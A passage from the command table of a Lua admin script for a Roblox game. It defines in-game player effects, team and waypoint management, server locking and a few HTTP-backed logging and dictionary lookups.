	[{"namedummy", "dummyname", "namenewdummy", "namedum", "dumname", "namefigure", "ndummy", "nnewdummy", "ndum", "nfigure"}] = {"string", "Creates a dummy named string", 1, "Member", false, function(Speaker, Rank, Arguments)
		CORE:CreateFigure(Arguments[1], nil, true, Speaker)
	end};
	
	[{"clone", "copy"}] = {"player", "Creates clone of player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			CORE:ClonePlayer(Player)
		end
	end};
	
	[{"nameclone", "clonename", "namecopy", "nclone", "ncopy"}] = {"player string", "Creates clone of player named string", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			CORE:ClonePlayer(Player, Arguments[2])
		end
	end};
	
	[{"clear", "clr"}] = {"", "Clears debris in workspace left by the admin", 0, "Member", false, function(Speaker, Rank, Arguments)
		for _,Obj in pairs(Objects) do
			if Obj then Obj:Destroy() end
		end
		for Name,Jail in pairs(Jails) do
			if not game.Players:FindFirstChild(Name) then
				Jail:Destroy()
				Jails[Name] = nil
			end
		end
		Objects = {}
	end};
	
	[{"clean", "cln"}] = {"", "Clears debris in workspace by players", 0, "Member", false, function(Speaker, Rank, Arguments)
		for _,Obj in pairs(Server.Workspace:GetChildren()) do
			if Obj:IsA("Accoutrement") or Obj:IsA("Tool") then
				Obj:Destroy()
			end
		end
	end};
	
	[{"sparkles", "sparks"}] = {"player", "Adds a sparkling effect to player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Sparkles = Instance.new("Sparkles", Player.Character.Torso) table.insert(Objects, Sparkles)
			end
		end
	end};
	
	[{"fire"}] = {"player", "Makes player catch on fire", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Fire = Instance.new("Fire", Player.Character.Torso) table.insert(Objects, Fire)
			end
		end
	end};
	
	[{"smoke"}] = {"player", "Adds a sparkling effect to player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Smoke = Instance.new("Smoke", Player.Character.Torso) table.insert(Objects, Smoke)
			end
		end
	end};
	
	[{"nosparkles", "nosparks", "unsparkles", "unsparks"}] = {"player", "Removes any sparkling effects to player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				for _,Get in pairs(Player.Character.Torso:GetChildren()) do
					if Get:IsA("Sparkles") then
						Get:Destroy()
					end
				end
			end
		end
	end};
	
	[{"nofire", "unfire"}] = {"player", "Removes player's fire effects", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				for _,Get in pairs(Player.Character.Torso:GetChildren()) do
					if Get:IsA("Fire") then
						Get:Destroy()
					end
				end
			end
		end
	end};
	
	[{"nosmoke", "unsmoke"}] = {"player", "Removes player's smoke effects", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				for _,Get in pairs(Player.Character.Torso:GetChildren()) do
					if Get:IsA("Smoke") then
						Get:Destroy()
					end
				end
			end
		end
	end};
	
	[{"explode", "explosion"}] = {"player", "Explodes player and everything around player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				SOUND:MakeSound(Player.Character.Torso, 187137543, 1, 1, false):Play()
				local Boom = Instance.new("Explosion", Workspace)
				Boom.Position = Player.Character.Torso.Position
			end
		end
	end};
	
	[{"splode", "smite"}] = {"player", "Explodes player 50 times and everything around player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				coroutine.wrap(function() for i = 1,50 do
					local Boom = Instance.new("Explosion", Workspace)
					Boom.Position = Player.Character.Torso.Position
					wait()
				end end)()
				coroutine.wrap(function() for i = 1,5 do
					SOUND:MakeSound(Player.Character.Torso, 187137543, 1, 1, false):Play()
				end end)()
			end
		end
	end};
	
	[{"superjump", "nograv", "lowgrav"}] = {"player", "Enables player to be able to jump super high", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Force = Player.Character.Torso:FindFirstChild("LMM SJ") if Force then Force:Destroy() end
				Force = Instance.new("BodyForce", Player.Character.Torso) Force.Name = "LMM SJ" Force.force = Vector3.new(0,0,0)
				CORE:ScanItems(Player.Character, {"BasePart"}, function(Obj) Force.force = Force.force + Vector3.new(0,Obj:GetMass() * 150,0) end)
			end
		end
	end};
	
	[{"normaljump", "grav", "nosuperjump", "unsuperjump"}] = {"player", "Disables player to be able to jump super high", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Force = Player.Character.Torso:FindFirstChild("LMM SJ") if Force then Force:Destroy() end
			end
		end
	end};
	
	[{"punish"}] = {"player", "Punishes player by removing player's character", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				Player.Character.Parent = Server.Lighting
			end
		end
	end};
	
	[{"nopunish", "unpunish"}] = {"player", "Undoes the punish effect on player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				Player.Character.Parent = Server.Workspace
				Player.Character:MakeJoints()
			end
		end
	end};
	
	[{"stun", "platformstand"}] = {"player", "Stuns player so he cannot move", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				Player.Character.Humanoid.PlatformStand = true
			end
		end
	end};
	
	[{"nostun", "unstun", "noplatformstand", "unplatformstand", "stand"}] = {"player", "Undoes the stun effect on player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				Player.Character.Humanoid.PlatformStand = false
			end
		end
	end};
	
	[{"jump"}] = {"player", "Makes player jump", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				Player.Character.Humanoid.Jump = true
			end
		end
	end};
	
	[{"sit", "sitdown"}] = {"player", "Makes player sit down", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				Player.Character.Humanoid.Sit = true
			end
		end
	end};
	
	[{"nosit", "unsit", "nositdown", "unsitdown", "stand", "standup"}] = {"player", "Makes player stand up if sitting down", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				Player.Character.Humanoid.Sit = false
			end
		end
	end};
	
	[{"spin", "turn", "spinaround"}] = {"player", "Makes player spin around", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Spin = Instance.new("BodyAngularVelocity", Player.Character.Torso) Spin.Name = "MML Spin" Spin.maxTorque = Vector3.new(0, math.huge, 0) Spin.angularvelocity = Vector3.new(0,20,0)
			end
		end
	end};
	
	[{"nospin", "unspin", "noturn", "unturn", "nospinaround", "unspinaround"}] = {"player", "Stops player from spinning around", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Spin = Player.Character.Torso:FindFirstChild("MML Spin") if Spin then Spin:Destroy() end
			end
		end
	end};
	
	[{"port"}] = {"", "Gets the server network port", 0, "Owner", false, function(Speaker, Rank, Arguments)
		GUI:SendMessage(Speaker, "Server Port", "The server port for this server is: "..Server.NS.Port, "Information")
	end};
	
	[{"chat"}] = {"player (color) string", "Makes player chat string. If color is available the color will be set to it", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Color = "Blue"
		local String = Arguments[2]
		local ChatSplit = STRING:GetSplit(String, 1, Settings.Bet)
		if #ChatSplit >= 2 then
			if string.lower(ChatSplit[1]) == "green" then
				Color = "Green"
				String = ChatSplit[2]
			elseif string.lower(ChatSplit[1]) == "red" then
				Color = "Red"
				String = ChatSplit[2]
			end
		end
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Head") then
				game:GetService("Chat"):Chat(Player.Character.Head, STRING:DetermineFilter(String, Speaker, Player), Color)
			end
		end
	end};
	
	[{"missile", "mis", "rocket"}] = {"player", "Turns player into a missile. Use with care!", 1, "Admin", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:ExecuteResource("Missile", Player.Character, {["Color"] = GUI:GetColor()})
			end
		end
	end};
	
	[{"face"}] = {"player num(ID)", "Changes player's faces player num(ID) (must be decal/image)", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local ID = nil
		if tonumber(Arguments[2]) ~= nil then
			ID = MARKET:GetImageFormat(tonumber(Arguments[2]))
		else
			for FaceTable,FaceID in pairs({[{":3", "=3", ";3"}] = "45448697", [{":D", "=D", ";D"}] = "40528907", [{"D:", "D=", "D;"}] = "147285493", [{":(", "=(", ";(", "):", ")=", ");"}] = "67493660", [{":)", "=)", ";)", "(:", "(=", "(;"}] = "41420967", [{":o", "=o", ";o", "o:", "o=", "o;", ":0", "=0", ";0", "0:", "0=", "0;"}] = "14995229", [{":P", "=P", ";P"}] = "35853859", [{":/", "=/", ";/", "/:", "/=", "/;", [[:\]], [[=\]], [[;\]], [[\:]], [[\=]], [[\;]]}] = "141764028", [{":I", "=I", ";I", "I:", "I=", "I;", ":|", "=|", ";|", "|:", "|=", "|;"}] = "14922431"}) do
				for _,Face in pairs(FaceTable) do
					if string.lower(Arguments[2]) == string.lower(Face) then
						ID = FaceID
						break
					end
				end
			end
		end
		if ID then
			for _,Player in pairs(Players) do
				if Player.Character and Player.Character:FindFirstChild("Head") and Player.Character.Head:FindFirstChild("face") then
					Player.Character.Head.face.Texture = "rbxassetid://"..ID
					pcall(function() Player.Character.Label:GetChildren()[1].Head.Texture = "rbxassetid://"..ID end)
				end
			end
		end
	end};
	
	[{"overlay", "ol"}] = {"player num(ID)", "Turns player's head into a 2D images of num(ID)", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local ID = MARKET:GetImageFormat(tonumber(Arguments[2]))
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Head") then
				local BB = Player.Character.Head:FindFirstChild("MMLA Overlay") if BB then BB:Destroy() end
				BB = Instance.new("BillboardGui", Player.Character.Head) BB.Name = "MMLA Overlay" BB.AlwaysOnTop = true BB.Size = UDim2.new(1,0,1,0) BB.Adornee = Player.Character.Head
				local Image = Instance.new("ImageLabel", BB) Image.BackgroundTransparency = 1 Image.Image = "rbxassetid://"..ID Image.Position = UDim2.new(-0.5,0,-0.5,0) Image.Size = UDim2.new(2,0,2,0)
			end
		end
	end};
	
	[{"nooverlay", "unoverlay", "nool", "unol"}] = {"player", "Removes any overlay on player's head from the overlay command", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Head") then
				local BB = Player.Character.Head:FindFirstChild("MMLA Overlay") if BB then BB:Destroy() end
			end
		end
	end};
	
	[{"notify"}] = {"string", "Sends string as a packet to the owner remotely", 1, "Admin", false, function(Speaker, Rank, Arguments)
		REMOTE:SendHttpLog(Speaker.Name.." Sent Notification: "..Arguments[1], "NOTIFICATION", Speaker)
	end, Http = true};
	
	[{"downloadlogs", "downloadhttplogs", "getlogs", "gethttplogs"}] = {"", "Downloads http logs sent by all admins using RemoteAdmin with a DataKey from the Linked Account", 0, "Admin", false, function(Speaker, Rank, Arguments)
		GUI:ListGui(Speaker, "Http Logs", CORE:ReverseTable(REMOTE:DownloadUserdata(false).Logs), "Log")
	end, Http = true};
		
	[{"note"}] = {"player string", "Saves string to player to all servers", 2, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local ExistingData = Player:LoadInstance("Data")
			if ExistingData == nil then
				ExistingData = Instance.new("Configuration")
			end
			ExistingData.Name = "Player Data"
			local Key = Instance.new("Configuration", ExistingData)
			Key.Name = Arguments[2]
			Player:SaveInstance("Data", ExistingData)
		end
	end};
	
	[{"removenote", "noteremove"}] = {"player string", "Removes any note starting with string", 2, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local Data = Arguments[2]
		for _,Player in pairs(Players) do
			local ExistingData = Player:LoadInstance("Data")
			if ExistingData ~= nil then
				if string.lower(Data) == "all" then
					ExistingData:ClearAllChildren()
				else
					for _,DataObj in pairs(ExistingData:GetChildren()) do
						if string.sub(string.lower(DataObj.Name),1,#Data) == string.lower(Data) then
							DataObj:Destroy()
						end
					end
				end
			end
			Player:SaveInstance("Data", ExistingData)
		end
	end};
	
	[{"shownotes", "shownote", "loadnotes", "loadnote", "notes", "getnotes", "getnote"}] = {"player", "Shows the saved notes of player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local DataSet = {}
		for _,Player in pairs(Players) do
			local ExistingData = Player:LoadInstance("Data")
			if ExistingData ~= nil then
				if #ExistingData:GetChildren() ~= 0 then
					for _,Data in pairs(ExistingData:GetChildren()) do
						table.insert(DataSet, Player.Name..": "..Data.Name)
					end
				else
					table.insert(DataSet, "Data does not exist for "..Player.Name)
				end
			else
				table.insert(DataSet, "Data does not exist for "..Player.Name)
			end
		end
		GUI:ListGui(Speaker, "Notes", DataSet)
	end};
	
	[{"forwards", "forward"}] = {"player", "Makes player walk forward at normal walkspeed", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				Player.Character.Humanoid.WalkSpeed = 16
			end
		end
	end};
	
	[{"backwards", "backward"}] = {"player", "Makes player walk backwards(reverse keys) at normal walkspeed", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				Player.Character.Humanoid.WalkSpeed = -16
			end
		end
	end};
	
	[{"teamnew", "teamcreate", "newteam", "createteam"}] = {"string", "Creates a new team named string. If a color is detected, the team color will be set to it.", 1, "Member", false, function(Speaker, Rank, Arguments)
		local TeamColor = BrickColor.random()
		local TeamName = Arguments[1]
		local TeamNameSplit = STRING:GetSplit(TeamName, 1, " ")
		if #TeamNameSplit >= 2 then
			local Color = TeamNameSplit[1]
			local NewTeamName = TeamNameSplit[2]
			if Color == "Medium stone grey" then
				TeamColor = BrickColor.new(Color)
				TeamName = NewTeamName
			elseif BrickColor.new(Color) ~= BrickColor.new("Medium stone grey") then
				TeamColor = BrickColor.new(Color)
				TeamName = NewTeamName
			elseif Colors[string.upper(Color)] then
				TeamColor = BrickColor.new(GUI:GetColor(string.upper(Color)))
				TeamName = NewTeamName
			end
		end
		
		local NewTeam = Instance.new("Team", Server.Teams)
		NewTeam.TeamColor = TeamColor
		NewTeam.Name = TeamName
	end};
	
	[{"leaveteam", "teamleave"}] = {"player", "Makes player be on no team", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			Player.Neutral = true
		end
	end};
	
	[{"team", "teamjoin", "jointeam"}] = {"player string", "Makes it so player joints team string", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		if string.lower(Arguments[2]) == "none" then
			for _,Player in pairs(Players) do
				Player.Neutral = true
			end
		else
			for _,Obj in pairs(Server.Teams:GetChildren()) do
				if Obj:IsA("Team") then
					if string.sub(string.lower(Obj.Name),1,#Arguments[2]) == string.lower(Arguments[2]) then
						for _,Player in pairs(Players) do
							Player.Neutral = false
							Player.TeamColor = Obj.TeamColor
						end
					end
				end
			end
		end
	end};
	
	[{"noteam", "unteam", "nonewteam", "unnewteam"}] = {"string", "Finds the team named string and removes it", 1, "Member", false, function(Speaker, Rank, Arguments)
		for _,Obj in pairs(Server.Teams:GetChildren()) do
			if Obj:IsA("Team") then
				if string.sub(string.lower(Obj.Name),1,#Arguments[1]) == string.lower(Arguments[1]) then
					for _,Player in pairs(Server.Players:GetPlayers()) do
						if Player.TeamColor == Obj.TeamColor then
							Player.Neutral = true
						end
					end
					Obj:Destroy()
				end
			end
		end
	end};
	
	[{"clearteams", "cleanteams"}] = {"", "Clears all teams", 0, "Member", false, function(Speaker, Rank, Arguments)
		for _,Player in pairs(Server.Players:GetPlayers()) do
			Player.Neutral = true
		end
		for _,Obj in pairs(Server.Teams:GetChildren()) do
			if Obj:IsA("Team") then
				Obj:Destroy()
			end
		end
	end};
	
	[{"countdown", "count", "ticker"}] = {"num", "Counts down an alarm from num", 1, "Member", false, function(Speaker, Rank, Arguments)
		for _,Player in pairs(Server.Players:GetPlayers()) do
			GUI:Countdown(Player, Arguments[1])
		end
	end};
	
	[{"showad", "ad"}] = {"player", "Shows an ad to player(As of now, only people on mobile devices can see)", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			if Player:FindFirstChild("Backpack") then
				CORE:ExecuteResource("ShowAd", Player.Backpack)
			end
		end
	end};
	
	[{"warp", "warpto"}] = {"player string", "Warps player to the point of string", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				for PosName,WP in pairs(Waypoints) do
					if string.sub(string.lower(PosName),1,#Arguments[2]) == string.lower(Arguments[2]) then
						Player.Character:MoveTo(WP + Vector3.new(0,0.5,0))
						break
					end
				end
			end
		end
	end};
	
	[{"waypoint", "addwaypoint"}] = {"string num(X) num(Y) num(Z)", "Adds a waypoint to warp named string with the XYZ coordinates", 4, "Admin", false, function(Speaker, Rank, Arguments)
		CORE:AddWaypoint(Arguments[1], Vector3.new(Arguments[2], Arguments[3], Arguments[4]), Speaker)
	end};
	
	[{"removewaypoint", "deletewaypoint", "destroywaypoint", "nowaypoint", "unwaypoint"}] = {"string", "Removes any waypoint named string", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Num = 0
		for PosName,WP in pairs(Waypoints) do
			Num = Num + 1
			if string.sub(string.lower(PosName),1,#Arguments[1]) == Arguments[1] then
				Waypoints[PosName] = nil
			end
		end
	end};
	
	[{"waypoints", "viewwaypoints", "waypointlist", "listwaypoints"}] = {"", "Views all waypoints to warp to", 0, "Member", false, function(Speaker, Rank, Arguments)
		local WaypointHolder,WaypointRaw = {},{}
		for Name, WP in pairs(Waypoints) do
			local View = Name..": "..tostring(WP)
			table.insert(WaypointHolder, View)
			WaypointRaw[View] = WP
		end
		local Clicked = GUI:ListGui(Speaker, "Waypoint List", WaypointHolder, "Map")
		Clicked.Event:connect(function(Text)
			local Waypoint = WaypointRaw[Text]
			if Waypoint then
				if Speaker.Character then
					Speaker.Character:MoveTo(Waypoint)
				end
			end
		end)
	end};
	
	[{"list", "listplayer", "listplayers"}] = {"player", "Lists the player(s) in a gui list", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local List = {}
		for _,Player in pairs(Players) do
			table.insert(List, Player.Name.." (ID: "..Player.UserId..")")
		end
		GUI:ListGui(Speaker, "Listed Players", List)
	end};
	
	[{"givepoints"}] = {"player num", "Gives num playerpoints to player", 2, "Owner", false, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[1]) then
			ypcall(function() Server.PS:AwardPoints(tonumber(Arguments[1]), tonumber(Arguments[2])) end)
		else
			local Players = STRING:Scan(Arguments[1], Speaker)
			for _,Player in pairs(Players) do
				ypcall(function() Server.PS:AwardPoints(Player.UserId, tonumber(Arguments[2])) end)
			end
		end
	end};
	
	[{"friends", "getfriends", "listfriends", "showfriends"}] = {"player", "Shows all the friends player is friends with in the server", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local Friends,OneFriend = {}, false
		for _,Player in pairs(Players) do
			for _,User in pairs(Server.Players:GetPlayers()) do if User ~= Player then
				--[[if Player:IsBestFriendsWith(User.UserId) then
					table.insert(Friends, Player.Name.." is best friends with "..User.Name)
					OneFriend = true
				]]
				if Player:IsFriendsWith(User.UserId) then
					table.insert(Friends, Player.Name.." is friends with "..User.Name)
					OneFriend = true
				end
				if _ == #Server.Players:GetPlayers() and OneFriend == false then
					table.insert(Friends, Player.Name.." has no friends in this server (Loner)")
				end
			end end
		end
		GUI:ListGui(Speaker, "Friend List", Friends)
	end};
	
	[{"serverlock", "lockserver"}] = {"", "Locks the server to prevent non-admins from joining", 0, "Owner", false, function(Speaker, Rank, Arguments)
		Settings.ServerLocked = true
		GUI:MessageAdmins("Server Locked", "The server has been locked. Only admins can join at this point.", 10, "Lock")
	end};
	
	[{"noserverlock", "unserverlock", "unlockserver", "nolockserver", "nolock", "unlock"}] = {"", "Unlocks the server to enable non-admin joining", 0, "Owner", false, function(Speaker, Rank, Arguments)
		Settings.ServerLocked = false
		GUI:MessageAdmins("Server Unlocked", "The server has been unlocked. Anyone not banned or crashed can join", 10, 11344402)
	end};
	
	[{"minage", "minimumage", "restrictage"}] = {" num", "Restricts any player that is younger than the age(in days) num from joining", 0, "Owner", false, function(Speaker, Rank, Arguments)
		local OldAge = Settings.MinimumAge
		local Age = tostring(Arguments[1])
		if Age then
			Settings.MinimumAge = Age
			GUI:MessageAdmins("Minumum age change", "The minimum age required to join this server is now "..Age.." days old(was "..OldAge.." days old)", 10)
		end
	end};
	
	[{"vipadmin", "adminvip"}] = {"", "Prompts speaker the VIP item to grant Admin level permissions", 0, "Non-Admin", false, function(Speaker, Rank, Arguments)
		if Settings.VIPAdminID <= 1 then
			MARKET:PromptPurchase(Speaker, VIPAdminID)
		else
			CORE:SendMessage(Speaker, "No Admin VIP", "The creator ("..GameOwner..") did not add a admin rank VIP to Make".."rModelLua's Admin", 7)
		end
	end};
	
	[{"vipmember", "membervip"}] = {"", "Prompts speaker the VIP item to grant Member level permissions", 0, "Non-Admin", false, function(Speaker, Rank, Arguments)
		if Settings.VIPMemberID <= 1 then
			MARKET:PromptPurchase(Speaker, VIPMemberID)
		else
			CORE:SendMessage(Speaker, "No Member VIP", "The creator ("..GameOwner..") did not add a member rank VIP to Make".."rModelLua's Admin", 7)
		end
	end};
	
	[{"headsize", "sizehead", "resizehead", "headresize"}] = {"player num", "Resizes player's head to num. 100 = normal size 200 = double size 50 = half size", 2, "Member", true, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[2]) then
			local Players = STRING:Scan(Arguments[1], Speaker)
			local Size = tonumber(Arguments[2])+25
			for _,Player in pairs(Players) do
				if Player.Character then
					if Player.Character:FindFirstChild("Head") then
						if Player.Character.Head:FindFirstChild("Mesh") then
							Player.Character.Head.Mesh.Scale = Vector3.new(Size/100,Size/100,Size/100)
						end
					end
				end
			end
		end
	end};
	
	[{"control"}] = {"player", "Allows speaker to take control of player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				CORE:ChangeCharacter(Speaker, Player.UserId, false, Speaker, true, Player.Character.Torso.Position)
				Player.Character.Parent = nil
				CORE:ExecuteResource("CameraControl", Player.Backpack, {["Speaker"] = Speaker})
			end
		end
	end};
	
	[{"settings"}] = {"", "Shows settings to speaker. If high enough rank, the speaker can edit settings", 0, "Non-Admin", false, function(Speaker, Rank, Arguments)
		GUI:SettingsGui(Speaker)
	end};
	
	[{"hasasset", "ownsasset"}] = {"player num(ID)", "Shows if player has asset num(ID)", 2, "Member", false, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[2]) then
			local Players = STRING:Scan(Arguments[1], Speaker)
			local List = {}
			for _,Player in pairs(Players) do
				if Server.MPS:PlayerOwnsAsset(Player, tonumber(Arguments[2])) then
					table.insert(List, Player.Name)
				end
			end
			GUI:ListGui(Speaker, "Players who have asset ID: "..Arguments[2], List, 23916171)
		end
	end};
	
	[{"reck", "rek", "rekt", "shrekt", "wreck", "noscope", "mlg"}] = {"player", "rekts player in a haxy way", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Head") then
				local Char = Player.Character
				Char:BreakJoints()
				CORE:ScanItems(Char, {"BasePart"}, function(Obj)
					Obj.Anchored = true
					for _,Face in pairs({"Top", "Bottom", "Right", "Left", "Front", "Back"}) do
						local Decal = Instance.new("Decal", Obj)
						Decal.Texture = "rbxassetid://178913323"
						Decal.Face = Face
					end
				end)
				local Sound1 = SOUND:MakeSound(Char.Head, 131509782, 1, 1)
				local Sound2 = SOUND:MakeSound(Char.Head, 179497874, 1, 1)
				Sound1:Play() Sound2:Play()
				coroutine.wrap(function()
					coroutine.wrap(function() wait(4.9) Sound1:Stop() Sound2:Stop() end)()
					repeat wait()
						CORE:ScanItems(Char, {"BasePart"}, function(Obj)
							SOUND:MakeSound(Char.Head, "rbxasset://sounds/uuhhh.mp3", 1, math.random(80,120)/100):Play()
							Obj.Transparency = math.random(0,30)/100
							Obj.Reflectance = math.random(0,50)/100
							Obj.CFrame = Obj.CFrame * CFrame.new(math.random(-10,10),math.random(-5,10),math.random(-10,10)) * CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))
						end)
					until Char ~= Player.Character or Char.Parent == nil
				end)()
			end
		end
	end, Hidden = true};
	
	[{"define", "lookup", "definition"}] = {"string", "Looks up the word on webster's online dictionary", 1, "Member", false, function(Speaker, Rank, Arguments)
		GUI:SendMessage(Speaker, "Definition of "..Arguments[1], REMOTE:DefineWord(Arguments[1]), 185923691)
	end, Http = true};
	
	[{"neon", "glow"}] = {"player", "Makes player glow like a neon light", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:ScanItems(Player.Character, {"BasePart"}, function(Obj)
					Obj.Material = "Neon"
				end)
			end
		end
	end};
	
	[{"noneon", "noglow", "unneon", "unglow"}] = {"player", "Removes any glowing neon from player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:ScanItems(Player.Character, {"BasePart"}, function(Obj)
					Obj.Material = "Plastic"
				end)
			end
		end
	end};
	
	[{"asd", "swag"}] = {"player", "Makes player look like a swagger", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:ScanItems(Player.Character, {"JointInstance"}, function(Obj)
					Obj.C0 = Obj.C0 * CFrame.new(math.random(-5,5),math.random(0,5),math.random(-5,5))
				end)
			end
		end
	end, Hidden = true};
	
	[{"getpos", "getposition", "playerpos", "playerposition"}] = {"player", "Gets player's position and prompts to add it to waypoints", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Pos = Player.Character.Torso.Position
				Pos = Vector3.new(CORE:Round(Pos.X), CORE:Round(Pos.Y), CORE:Round(Pos.Z))
				local Answer = GUI:PromptMessageWithButtons(Speaker, Player.Name.."'s position", Player.Name.." is located at ("..tostring(Pos)..") would you like a waypoint under his/her name?", "Question", {"Cancel", "Ok"})
				if Answer == "Ok" then
					CORE:AddWaypoint(Player.Name, Pos, Speaker)
				end
			end
		end
	end};
	
